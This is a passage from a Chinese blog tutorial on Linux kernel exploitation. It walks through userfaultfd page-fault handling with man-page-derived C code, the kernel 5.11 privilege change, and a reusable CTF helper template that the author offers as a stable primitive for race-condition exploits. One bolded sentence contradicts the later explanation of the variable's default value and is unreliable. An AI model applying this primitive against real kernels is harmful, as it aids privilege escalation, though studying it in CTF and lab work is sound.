class="built_in">printf</span>(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We expect only one kind of event; verify that assumption */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Display info about the page-fault event */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span></span><br><span class="line"><span class="comment">            region. Vary the contents that are copied in, so that it</span></span><br><span class="line"><span class="comment">            is more obvious that each fault is handled separately. */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">        fault_cnt++;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to handle page faults in units of pages(!).</span></span><br><span class="line"><span class="comment">        So, round faulting address down to page boundary */</span></span><br><span class="line"></span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(uffdio_copy.copy returned %lld)\n&quot;</span>, uffdio_copy.copy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>有人可能注意到了 <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> 这个奇怪的句子，在这里作用是将触发缺页异常的地址<strong>按页对齐</strong>作为后续拷贝的起始地址</p>
<blockquote>
<p>比如说触发的地址可能是 0xdeadbeef，直接从这里开始拷贝一整页的数据就拷歪了，应当从 0xdeadb000 开始拷贝（假设页大小 0x1000）</p>
</blockquote>
<p><strong>例程</strong></p>
<p>测试例程如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span>   <span class="comment">/* Data read from userfaultfd */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;     <span class="comment">/* Number of faults so far handled */</span></span><br><span class="line">    <span class="type">long</span> uffd;                    <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a page that will be copied into the faulting region */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">            errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Loop, handling incoming events on the userfaultfd</span></span><br><span class="line"><span class="comment">        file descriptor */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See what poll() tells us about the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nfault_handler_thread():\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; &quot;</span></span><br><span class="line">                <span class="string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,</span><br><span class="line">                (pollfd.revents &amp; POLLIN) != <span class="number">0</span>,</span><br><span class="line">                (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read an event from the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We expect only one kind of event; verify that assumption */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Display info about the page-fault event */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span></span><br><span class="line"><span class="comment">            region. Vary the contents that are copied in, so that it</span></span><br><span class="line"><span class="comment">            is more obvious that each fault is handled separately. */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">        fault_cnt++;</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We need to handle page faults in units of pages(!).</span></span><br><span class="line"><span class="comment">        So, round faulting address down to page boundary */</span></span><br><span class="line"></span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,</span><br><span class="line">               uffdio_copy.copy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;          <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">char</span> *addr;         <span class="comment">/* Start of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;  <span class="comment">/* Length of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">pthread_t</span> thr;      <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a private anonymous mapping. The memory will be</span></span><br><span class="line"><span class="comment">        demand-zero paged--that is, not yet allocated. When we</span></span><br><span class="line"><span class="comment">        actually touch the memory, it will be allocated via</span></span><br><span class="line"><span class="comment">        the userfaultfd. */</span></span><br><span class="line">    len = <span class="number">0x1000</span>;</span><br><span class="line">    addr = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">        errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Register the memory range of the mapping we just created for</span></span><br><span class="line"><span class="comment">    handling by the userfaultfd object. In mode, we request to track</span></span><br><span class="line"><span class="comment">    missing pages (i.e., pages that have not yet been faulted in). */</span></span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create a thread that will process the userfaultfd events */</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Trigger the userfaultfd event */</span></span><br><span class="line">    <span class="type">void</span> * ptr = (<span class="type">void</span>*) *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get data: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>起个虚拟机跑一下，我们可以看到在我们监视的匿名页内成功地被我们写入了想要的数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7iQO1b64XNaTkG8.png"
                      alt="img"
                ></p>
<h3 id="新版本内核对抗"><a href="#新版本内核对抗" class="headerlink" title="新版本内核对抗"></a>新版本内核对抗</h3><p><strong>需要说明的是，自从 5.11 版本起内核 <code>fs/userfaultfd.c</code> 中全局变量 <code>sysctl_unprivileged_userfaultfd</code> 初始化为 1，这意味着只有 root 权限用户才能使用 userfaultfd 。</strong><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e2LRJKzQVYSTO5k.png"
                      alt="image.png"
                ></p>
<p>这是因为在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值：</p>
<blockquote>
<p>来自 linux-5.11 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">SYSCALL_DEFINE1(userfaultfd, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userfaultfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">        printk_once(KERN_WARNING <span class="string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span></span><br><span class="line">            <span class="string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span></span><br><span class="line">            <span class="string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>来自 linux-5.4 源码<code>fs/userfaultfd.c</code>：</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong></p>
<p>这意味着在较新版本内核中<strong>只有 root 权限才能使用 userfaultfd</strong>，这或许意味着刚刚进入大众视野的 userfaultfd 可能又将逐渐淡出大众视野，但不可否认的是，userfaultfd 确乎为我们在 Linux kernel 中的条件竞争利用提供了一个全新的思路与一种极其稳定的利用手法。</p>
<h3 id="CTF-中的-userfaultfd-板子"><a href="#CTF-中的-userfaultfd-板子" class="headerlink" title="CTF 中的 userfaultfd 板子"></a>CTF 中的 userfaultfd 板子</h3><p>userfaultfd 的整个操作流程比较繁琐，故笔者现给出如下板子：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span> (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在使用时直接调用即可：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registerUserFaultFd(addr, len, handler);</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是 handler 的写法，这里直接照抄 Linux man page 改了改，可以根据个人需求进行个性化改动：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>; <span class="comment">// 你要拷贝进去的数据</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span 